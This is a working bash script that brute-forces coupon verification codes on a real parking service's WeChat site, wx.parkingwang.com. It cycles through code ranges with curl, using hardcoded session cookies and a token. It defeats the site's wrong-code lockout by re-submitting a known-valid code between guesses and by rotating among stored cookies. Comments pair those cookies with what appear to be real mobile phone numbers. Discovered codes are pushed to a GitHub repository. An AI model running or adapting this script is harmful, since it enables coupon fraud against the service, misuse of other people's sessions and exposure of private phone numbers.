#!/bin/bash

# $0 [forceSeek=KTV_Hotel_Group]
shellname=`basename $0 | cut -d "." -f 1`
procname="${shellname}_$$"
cmdoptfile="tmp_cmdopt_${procname}.swap"
echo -n "" > ${cmdoptfile}
for iter_cmdopt in "$@"
do
    echo ${iter_cmdopt} >> ${cmdoptfile}
done

# const or global param
id_k="BkPTdVZaOYaoML6UwMGJyg==";id_h="ZT5pUv4JKL1tomT0u9SEdA==";id_g="NEEF0YcfsFZQSDlWHBblaw==";
configSep=":"
cmdOptSep="="
keepAliveTimeout=3600
seekTimeout=2400
lineTimeout=30
configfile=tmpConfig_${shellname}.cfg
configKeyOkCode="cfg_ok_code"
configKeyOkId="cfg_ok_id"
configKeyOldHour="cfg_old_hour"
configKeyKeepAlive="cfg_keep_alive"
configKeyLastSeek="cfg_last_seek"
configKeyShellPid="cfg_shell_pid"

colorecho()
{
    p_color=$1;shift;
    p_msg=$*
    p_color_code=32
    [ "${p_color:0:1}x" == "rx" ] && p_color_code=31
    [ "${p_color:0:1}x" == "gx" ] && p_color_code=32
    echo -e "\\033[${p_color_code}m\\033[1m${p_msg}\\033[0m"
}
save_config()
{
    p_cfgfile=$1;shift;
    p_key=$1;shift;
    p_value=$1;shift

    touch ${p_cfgfile}
    cat ${p_cfgfile} | grep -v "${p_key}${configSep}" > ${p_cfgfile}.swap && mv ${p_cfgfile}.swap ${p_cfgfile}
    echo "${p_key}${configSep}${p_value}" >> ${p_cfgfile}
}
read_config()
{
    p_cfgfile=$1;shift;
    p_key=$1;shift;
    p_value=$1;shift

    touch ${p_cfgfile}
    new_value=`cat "${p_cfgfile}" | grep "${p_key}${configSep}" | cut -d "${configSep}" -f 2-`
    [ "${new_value}x" == "x" -a "${p_value}x" != "x" ] && new_value="${p_value}"
    echo "${new_value}"
}
# DO NOT call this function in `` or $() directly or indirectly, exit will no work if you do this!!
keep_alive()
{
    p_force=$1;shift;

    [ "${p_force}x" != "x" ] && save_config ${configfile} ${configKeyShellPid} "$$"
    [ $(read_config ${configfile} ${configKeyShellPid} 0) -eq $$ ] && save_config ${configfile} ${configKeyKeepAlive} "$(date +%s)" || { echo "$(colorecho "r" "Error: unmatch shell pid!")"; exit_clsopt 3; }
}
getcmdopt()
{
    p_key=$1;shift;
    p_def=$1;shift;

    p_sep="${cmdOptSep}"
    opt_value=`cat ${cmdoptfile} | grep "^${p_key}${p_sep}" | head -n 1 | cut -d "${p_sep}" -f 2-`
    [ "${opt_value}x" == "x" -a "${p_def}x" != "x" ] && opt_value="${p_def}"
    echo "${opt_value}"
}
exit_clsopt()
{
    p_exitcode=$1;shift;
    [ "${p_exitcode}x" == "x" ] && p_exitcode=0
    
    rm -rf ${cmdoptfile}
    [ $(read_config ${configfile} ${configKeyShellPid} 0) -eq $$ ] && save_config ${configfile} ${configKeyKeepAlive} 0
    exit ${p_exitcode}
}
ck=$(getcmdopt "ck")
n1=$(getcmdopt "n1")
n2=$(getcmdopt "n2")

keepAliveValue=`read_config ${configfile} ${configKeyKeepAlive} 0`
switchForceRun=$(getcmdopt "forceRun" "no")
[ $(($(date +%s)-${keepAliveValue})) -gt ${keepAliveTimeout} ] && switchCanRun="yes" || switchCanRun="no"
[ "${switchCanRun}x" == "yesx" -o "${switchForceRun}x" == "yesx" ] && runColor="g" || runColor="r"
echo "$(colorecho "${runColor}" "BEGIN ") $(date +"%Y-%m-%d %H:%M:%S") cmd_ck=${ck} cmd_n1=${n1} cmd_n2=${n2} canRun=${switchCanRun} forceRun=${switchForceRun}"
[ "${runColor}x" != "gx" ] && exit_clsopt 2

# begin run and mark self
keep_alive "setPid"

#result
resCode_H="";resCode_K="";resCode_G="";
resfile=tmpResultCode_${shellname}.tmp
gitlogfile=crontab.log
gitcodefile=vcode.txt
#ok inf
ok_code=580
ok_id="${id_k}"
cfgValue=`read_config ${configfile} ${configKeyOkCode}`
[ "${cfgValue}x" != "x" ] && ok_code=${cfgValue}
cfgValue=`read_config ${configfile} ${configKeyOkId}`
[ "${cfgValue}x" != "x" ] && ok_id=${cfgValue}

query_park()
{
    p_c=$1;shift;
    p_code=$1;shift;
    p_id=$1;shift;

    curl -L "http://wx.parkingwang.com/coupon/coupon_show?coupon=${p_id}&verification=${p_code}" \
    -H "Cookie: parking_ses=${p_c}" \
    -H 'Connection: keep-alive' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
    -H 'Referer: http://wx.parkingwang.com/coupon/input_code?coupon_id=BkPTdVZaOYaoML6UwMGJyg==' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Accept-Language: zh-CN,zh;q=0.9' \
    -H 'misctooltoken: c6d1ad2b9afs4fbab56aaa3e0267deb9' --compressed 2>&1 | egrep "(alert)|(span)" | paste -s -d ":" -
}

parse_res()
{
    p_res=$1;shift;
    if echo "${p_res}" | grep -q "请输入车牌"
    then
        echo "res:success"
    elif echo "${p_res}" | grep -q "输入您的手机号码"
    then
        echo "res:fail:ck:login"
    elif echo "${p_res}" | grep -q "输入错误验证码次数过多"
    then
        echo "res:fail:ck:block"
    elif echo "${p_res}" | grep -q "请求参数错误"
    then
        echo "res:fail:id:param"
    elif echo "${p_res}" | grep -q "优惠券不存在"
    then
        p_n=`echo "${p_res}" | egrep  "(优惠券不存在)" | grep -o "[0-9]次" | grep -o "[0-9]"`
        [ "${p_n}x" == "x" ] && p_n="x"
        echo "res:fail:code:${p_n}"
    elif echo "${p_res}" | grep -q "没有优惠券了"
    then
        p_n=`echo "${p_res}" | egrep  "(没有优惠券了)" | grep -o "[0-9]次" | grep -o "[0-9]"`
        [ "${p_n}x" == "x" ] && p_n="x"
        echo "res:fail:code:${p_n}"
    else
        echo ${p_res}
    fi
}

check_park()
{
    p_c=$1;shift;
    p_code=$1;shift;
    p_id=$1;shift;

    # BkPTdVZaOYaoML6UwMGJyg==
    # ZT5pUv4JKL1tomT0u9SEdA==
    [ "${p_code}x" == "x" ] && p_code="${ok_code}"
    [ "${p_id}x" == "x" ] && p_id="${ok_id}"
    #echo "ck=#${p_c}# code=#${p_code}# id=#${p_id}#"

    p_html=`query_park ${p_c} ${p_code} ${p_id}`
    parse_res "${p_html}"
}

do_try()
{
    p_ck=$1;shift;
    p_code=$1;shift;
    p_tryId=$1;shift;
    
    keep_alive
    [ "${p_tryId}x" == "x" ] && p_tryId="${id_h}"
    p_s=`check_park ${p_ck} ${p_code} ${p_tryId}`
    if echo "${p_s}" | grep -q "res:success"
    then
        echo -n -e " [\\033[32m\\033[1m$(printf "%3d" ${p_code})\\033[0m]"
        [ "${p_tryId}x" == "${id_h}x" ] && resCode_H="${resCode_H} ${p_code} "
        [ "${p_tryId}x" == "${id_k}x" ] && resCode_K="${resCode_K} ${p_code} "
        [ "${p_tryId}x" == "${id_g}x" ] && resCode_G="${resCode_G} ${p_code} "
    else
        ns=`echo "${p_s}" | grep "res:fail:code" | cut -d ":" -f 4`
        [ "${ns}z" == "z" ] && ns="Q"
        [ "${ns}z" == "xz" ] && echo -n -e " \\033[31m\\033[1m$(printf "%3d" ${p_code})\\033[0m|${ns}" || echo -n " $(printf "%3d" ${p_code})|${ns}"
   fi
}

sendgit()
{
    p_file=$1;shift;
    p_linen=$1;shift;
    p_desc=$1;shift;
    p_msg=$*

    p_dir=~/work/code/github/board
    p_tmpfile="tmp_${p_file}.tmp"
    p_gittime=`date +"%m-%d %H:%M:%S"`

    echo "${p_gittime} ${p_msg}" | cat - ${p_dir}/${p_file} | head -n ${p_linen} > ${p_tmpfile}
    cat ${p_tmpfile} > ${p_dir}/${p_file}
    cd ${p_dir} && git commit -a -m "add line by shell" && echo "git commit [${p_desc}] $(colorecho "g" "success")" || echo "git commit [${p_desc}] $(colorecho "r" "fail")"; cd -
    cd ${p_dir} && git push && echo "git push [${p_desc}] $(colorecho "g" "success")" || echo "git push [${p_desc}] $(colorecho "r" "fail")"; cd -
}
loggit()
{
    p_desc=$1;shift;
    p_msg=$*
    sendgit ${gitlogfile} 60 ${p_desc} ${p_msg}
}
trim_str()
{
    p_str=$*

    echo "${p_str}" | grep "[0-9]\+" -o | sort -n | uniq | paste -s -d " " -
}
savefile()
{
    p_resfile=$1;shift;
    p_code_H=$1;shift;
    p_code_K=$1;shift;
    p_code_G=$1;shift;
        
    echo -n "" > ${p_resfile}
    for i in `echo "${p_code_H}" | grep "[0-9]\+" -o`
    do
        echo "${i}:${id_h}" >> ${resfile}
    done
    for i in `echo "${p_code_K}" | grep "[0-9]\+" -o`
    do
        echo "${i}:${id_k}" >> ${resfile}
    done
    for i in `echo "${p_code_G}" | grep "[0-9]\+" -o`
    do
        echo "${i}:${id_g}" >> ${resfile}
    done
}
savegit()
{
    p_msg=$*

    p_dir=~/work/code/github/board
    p_old_msg=`head -n 1 ${p_dir}/${gitcodefile} | cut -d " " -f 3-`
    [ "${p_old_msg}x" == "${p_msg}x" ] && { echo "$(colorecho "r" "REPEAT") msg: ${p_msg}"; return 0; }

    sendgit ${gitcodefile} 60 "SaveCode" ${p_msg}
}

# ckinfo ea19e08ba88c439e903affd4bfa631e2dca6f644 18866674195 20191031
# ckinfo c36ed18d64b225e25fcc52f4fe90ddc69fa6c12c 15263819419 20191031
# ckinfo 48c8de6edae8c60ff2ca5847a2f5f35489966a90 18866674223 20191031
# ckinfo 4a961a7390091a410675839e8d4622bf8b37fef7 17109324204 20191020 1023x 1028
# ckinfo 364beeb9d67580f6ab8f1906e36f576a7ff3925d 18866674180 20191023 1023x 1028
# ckinfo 8db19b98f9f8e97820da19772e77875d90407413 18866674211 20191023 1023x 1028
#
# ckinfo 25c04bd9b5b7e78a44f5546219dacd1d2fa8913f 13001077534 20191014 1023 slow
# ckinfo ef74b1cf95139da7ce9d19ce02113a2f5914f71c 17128240042 20191023
# ckinfo a75ef402921948a497acdb38b0bef33c5b245e90 18866478794 20191023
# ckinfo 24a6af824b90763b738663e64464c682ed5d09ad 17128240164 20191023
# ckinfo 892972fd5a016156bfad33c119ce1283a801e3f6 13521838587 20191020 1023x 1028
# ckinfo 6a0b36cde3bf78babfce15b8da8af79dc694b231 18515987963 20190901 1023x 1028
# ckinfo 392a777819e640839d2d838a2855239f239a53f4 15263819410 20191023
# ckinfo bba42eafa9984768840163f14c81ff654cf13d6b 18866674230 20191031
#
#如果速度很慢，重新登录换一个Cookie

# test cookie
ck_set="
ea19e08ba88c439e903affd4bfa631e2dca6f644
c36ed18d64b225e25fcc52f4fe90ddc69fa6c12c
48c8de6edae8c60ff2ca5847a2f5f35489966a90
4a961a7390091a410675839e8d4622bf8b37fef7
364beeb9d67580f6ab8f1906e36f576a7ff3925d
8db19b98f9f8e97820da19772e77875d90407413
"
best_ck=""
besk_ckt=998
ck_OK_n=0
ck_Fail_n=0
for ick in ${ck_set}
do
    cks1=`date +%s`
    check_park ${ick} | grep -q "res:fail:ck" && ck_flag="n" || ck_flag="Y"
    cks2=`date +%s`
    ck_t=$((cks2-cks1))
    echo -n "[$(printf "%3d" ${ck_t})] ${ck_flag} ${ick}"
    [ "${ck_flag}x" == "Yx" ] && ck_OK_n=$((ck_OK_n+1)) || ck_Fail_n=$((ck_Fail_n+1))
    [ "${ck_flag}x" == "Yx" -a \( ${ck_t} -lt ${besk_ckt} -o "${best_ck}x" == "x" \) ] && { besk_ckt=${ck_t}; best_ck="${ick}"; echo " U"; } || { echo " -"; }
done
echo "ckN:${ck_OK_n}:${ck_Fail_n} T:${besk_ckt} ${best_ck}"

[ "${ck}x" == "x" ] && ck="${best_ck}"
[ "${n1}x" == "x" ] && n1=10
[ "${n2}x" == "x" ] && n2=999
echo " begin=${n1} end=${n2} ck=${ck} ${ok_id:0:2}_Code=${ok_code}"
if [ "${ck}x" == "x" ]
then
    errExitMsg="ckN=${ck_OK_n}:${ck_Fail_n} T=${besk_ckt} err=noValidCk"
    echo "${errExitMsg}"
    loggit "LostCk" "${errExitMsg}"
    exit_clsopt 1
fi
find_best_ck()
{
    p_def_ck=$1;shift;
    
    p_best_ck="${p_def_ck}"
    p_best_ckt=997
    for ick in ${ck_set}
    do
        cks1=`date +%s`
        check_park ${ick} | grep -q "res:fail:ck" && ck_flag="n" || ck_flag="Y"
        cks2=`date +%s`
        ck_t=$((cks2-cks1))
        [ "${ck_flag}x" == "Yx" -a \( ${ck_t} -lt ${p_best_ckt} -o "${p_best_ck}x" == "x" \) ] && { p_best_ckt=${ck_t}; p_best_ck="${ick}"; }
    done
    echo "${p_best_ck}"
}

cfm_N=0
cfm_HokN=0;cfm_KokN=0;cfm_GokN=0;
cfm_failN=0
cfm_HfailN=0;cfm_KfailN=0;cfm_GfailN=0;
cfm_checkRes=""
ok_code_bak=""
ok_id_bak=""
touch ${resfile}
for iterLine in `cat ${resfile}`
do
    cfm_N=$((cfm_N+1))
    iterCode=`echo ${iterLine} | cut -s -d ":" -f 1`
    iterId=`echo ${iterLine} | cut -s -d ":" -f 2`
    [ "${iterId}x" == "x" ] && iterId="${id_h}"
    iterIdType="X"
    [ "${iterId}x" == "${id_h}x" ] && iterIdType="H"
    [ "${iterId}x" == "${id_k}x" ] && iterIdType="K"
    [ "${iterId}x" == "${id_g}x" ] && iterIdType="G"
    s=`check_park ${ck} ${iterCode} ${iterId}`
    if echo "${s}" | grep -q "res:success" 
    then
        ok_code_bak=${iterCode}
        ok_id_bak="${iterId}"
        [ "${iterId}x" == "${id_h}x" ] && { cfm_HokN=$((cfm_HokN+1)); resCode_H="${resCode_H} ${iterCode} "; }
        [ "${iterId}x" == "${id_k}x" ] && { cfm_KokN=$((cfm_KokN+1)); resCode_K="${resCode_K} ${iterCode} "; }
        [ "${iterId}x" == "${id_g}x" ] && { cfm_GokN=$((cfm_GokN+1)); resCode_G="${resCode_G} ${iterCode} "; }
        cfm_checkRes="${cfm_checkRes}${iterCode}<${iterIdType}y>"
    else
        cfm_failN=$((cfm_failN+1))
        [ "${iterId}x" == "${id_h}x" ] && cfm_HfailN=$((cfm_HfailN+1))
        [ "${iterId}x" == "${id_k}x" ] && cfm_KfailN=$((cfm_KfailN+1))
        [ "${iterId}x" == "${id_g}x" ] && cfm_GfailN=$((cfm_GfailN+1))
        cfm_checkRes="${cfm_checkRes}${iterCode}<${iterIdType}n>"
    fi
done
cfm_HpassFlag="no";cfm_KpassFlag="no";cfm_GpassFlag="no";
needSaveGitCode="NA"
forceSeek=$(getcmdopt "forceSeek")
if echo "${forceSeek}" | grep -q "Hotel"
then
    cfm_HpassFlag="force"
elif [ ${cfm_HokN} -ge 1 ]
then
    if [ ${cfm_HokN} -ge 2 -o ${cfm_HfailN} -eq 0 ]
    then
        cfm_HpassFlag="yes"
    fi
fi
if echo "${forceSeek}" | grep -q "KTV"
then
    cfm_KpassFlag="force"
elif [ ${cfm_KokN} -ge 1 ]
then
    LastSeekValue_K=`read_config ${configfile} "${configKeyLastSeek}K" 0`
    if [ ${cfm_KokN} -ge 2 -o \( ${cfm_KfailN} -le 0 -a $(($(date +%s)-${LastSeekValue_K})) -lt ${seekTimeout} \) ]
    then
        cfm_KpassFlag="yes"
    fi
fi
if echo "${forceSeek}" | grep -q "Group"
then
    cfm_GpassFlag="force"
elif [ ${cfm_GokN} -ge 1 ]
then
    LastSeekValue_G=`read_config ${configfile} "${configKeyLastSeek}G" 0`
    if [ ${cfm_GokN} -ge 2 -o \( ${cfm_GfailN} -le 0 -a $(($(date +%s)-${LastSeekValue_G})) -lt ${seekTimeout} \) ]
    then
        cfm_GpassFlag="yes"
    fi
fi
if [ "${cfm_HpassFlag}x" == "yesx" -a "${cfm_KpassFlag}x" == "yesx" -a "${cfm_GpassFlag}x" == "yesx" ]
then
    [ ${cfm_failN} -gt 0 ] && needSaveGitCode="yes" || needSaveGitCode="no"
fi
logTxt="ckN=${ck_OK_n}:${ck_Fail_n}:${besk_ckt}s codeN=${cfm_HokN}:${cfm_KokN}:${cfm_GokN}-${cfm_HfailN}:${cfm_KfailN}:${cfm_GfailN}/${cfm_N}:${cfm_HpassFlag}:${cfm_KpassFlag}:${cfm_GpassFlag}:${needSaveGitCode} checkRes=${cfm_checkRes} ck=${ck:0:4}"

# check ok_code and ok_id
check_park ${ck} ${ok_code} ${ok_id} | grep -q "res:success" && logTxt="${ok_id:0:2}=${ok_code} ${logTxt}" || ok_code=""
[ "${ok_code}x" == "x" -a "${ok_code_bak}x" != "x" ] && { ok_code=${ok_code_bak}; ok_id="${ok_id_bak}"; logTxt="${ok_id:0:3}=${ok_code} ${logTxt}"; }
[ "${ok_code}x" == "x" ] && logTxt="err=noValidOkCode ${logTxt}"

# send by github
echo ${logTxt}
loggit "InfoLog" ${logTxt}

# exit if no ok_code can use
if [ "${ok_code}x" == "x" ]
then
    exit_clsopt 1
fi

# save ok_code and ok_id
save_config ${configfile} ${configKeyOkCode} "${ok_code}"
save_config ${configfile} ${configKeyOkId} "${ok_id}"
save_config ${configfile} ${configKeyOldHour} "$(date +%Y-%m-%d_%H)"

# reset ck
for ick in ${ck_set}
do
    check_park ${ick} ${ok_code} ${ok_id} | grep -q "res:success" && echo "[RST] Y ok_code=${ok_code} ck=${ick}" || echo "[RST] n ok_code=${ok_code} ck=${ick}"
done

if [ "${cfm_HpassFlag}x" == "yesx" -a "${cfm_KpassFlag}x" == "yesx"  -a "${cfm_GpassFlag}x" == "yesx" ]
then
    # sync code to git if need
    if [ "${needSaveGitCode}x" == "yesx" ]
    then
        savefile ${resfile} "${resCode_H}" "${resCode_K}" "${resCode_G}"
        savegit "Hotel: $(trim_str ${resCode_H}) KTV: $(trim_str ${resCode_K}) Group: $(trim_str ${resCode_G})"
    fi
    exit_clsopt 0
fi

time2letter()
{
    p_time=$1;shift;

    p_letter="#"
    if [ ${p_time} -le 0 ]
    then
        p_letter="@"
    elif [ ${p_time} -gt 26 ]
    then
        p_letter="$"
    else
        p_letter=`echo "ABCDEFGHIJKLMNOPQRSTUVWXYZ" | cut -c${p_time}`
    fi
    [ "${p_letter}x" == "x" ] && p_letter="*"
    echo ${p_letter}
}
seek_code()
{
    p_tryId=$1;shift;
    [ "${p_tryId}x" == "x" ] && p_tryId="${id_h}"
    p_seekType="X"
    [ "${p_tryId}x" == "${id_h}x" ] && p_seekType="H"
    [ "${p_tryId}x" == "${id_k}x" ] && p_seekType="K"
    [ "${p_tryId}x" == "${id_g}x" ] && p_seekType="G"

    meter_d1=`date +"%Y-%m-%d %H:%M:%S"`
    meter_n=0
    ctrl_ln=30
    ctrl_lc=${ctrl_ln}
    lineT1=$(date +%s)
    echo "SeekId: [${p_seekType}] ${p_tryId} ck=${ck}"
    for i in `seq ${n1} 3 ${n2}`
    do 
        if [ ${ctrl_lc} -ge ${ctrl_ln} ]
        then
            lineT2=$(date +%s);lineT=$((${lineT2}-${lineT1}));lineT1=$(date +%s);
            [ ${lineT} -gt ${lineTimeout} ] && ck=$(find_best_ck ${ck})
            echo ""
            echo -n "$(date +%H:%M:%S) $(printf "%3d" ${lineT}) ${ck:0:2}"
            ctrl_lc=0
        fi
        
        j=${i}
        # reset code
        rstSucFlag="false"
        rstBeginTime=`date +%s`
        for idxRst in `seq 1 9`
        do
            #[ $(echo $RANDOM | cut -c1) -le 1 ] && continue
            check_park ${ck} ${ok_code} ${ok_id} | grep -q "res:success" && { echo -n " $(time2letter $(($(date +%s)-${rstBeginTime})))${idxRst}"; rstSucFlag="success"; break; }
        done
        [ "${rstSucFlag}x" != "successx" ] && { echo " Fail"; exit_clsopt 1; }
    
        do_try ${ck} ${j} ${p_tryId}; meter_n=$((meter_n+1)); ctrl_lc=$((ctrl_lc+1)); j=$((j+1));
        do_try ${ck} ${j} ${p_tryId}; meter_n=$((meter_n+1)); ctrl_lc=$((ctrl_lc+1)); j=$((j+1));
        do_try ${ck} ${j} ${p_tryId}; meter_n=$((meter_n+1)); ctrl_lc=$((ctrl_lc+1)); j=$((j+1));
    done
    meter_d2=`date +%Y-%m-%d#%H:%M:%S`
    echo ""
    resCode_H=`echo "${resCode_H}" | grep "[0-9]\+" -o | sort -n | uniq | paste -s -d " " -`
    resCode_K=`echo "${resCode_K}" | grep "[0-9]\+" -o | sort -n | uniq | paste -s -d " " -`
    resCode_G=`echo "${resCode_G}" | grep "[0-9]\+" -o | sort -n | uniq | paste -s -d " " -`
    echo "beginT=${meter_d1} endT=${meter_d2} n=${meter_n} seekId=${p_tryId:0:2} resCode_H=${resCode_H} resCode_K=${resCode_K} resCode_G=${resCode_G}"
    save_config ${configfile} "${configKeyLastSeek}${p_seekType}" "$(date +%s)"
}

[ "${cfm_HpassFlag}x" == "yesx" ] || seek_code ${id_h}
[ "${cfm_KpassFlag}x" == "yesx" ] || seek_code ${id_k}
[ "${cfm_GpassFlag}x" == "yesx" ] || seek_code ${id_g}

# send by github
if [ "${tryId}x" != "${id_k}x" ]
then
    savefile ${resfile} "${resCode_H}" "${resCode_K}" "${resCode_G}"
    savegit "Hotel: $(trim_str ${resCode_H}) KTV: $(trim_str ${resCode_K}) Group: $(trim_str ${resCode_G})"
else
    loggit "logKTVcode" "log_KTV_code: ${res_codeK}"
fi

# exit with clear action
exit_clsopt 0

